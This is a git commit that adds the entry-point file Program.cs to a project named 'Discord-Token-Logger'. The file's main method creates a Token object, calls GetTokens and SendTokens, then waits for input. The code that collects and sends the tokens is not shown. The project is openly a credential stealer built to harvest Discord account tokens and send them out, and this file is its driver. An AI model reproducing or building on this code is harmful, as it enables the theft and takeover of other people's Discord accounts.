32a1f9a33e08f5240d3c20f2ead4e04a5b656330
iPaja <81321202+iPajaa@users.noreply.github.com>
2021-12-04 15:36:04 +0100

    Add files via upload

---
+++ Discord-Token-Logger-main/Logger/Logger/Program.cs
@@ -0,0 +1,15 @@
+﻿using System;
+
+namespace Logger
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            Token classInstance = new Token();
+            classInstance.GetTokens();
+            classInstance.SendTokens();
+            Console.ReadLine();
+        }
+    }
+}
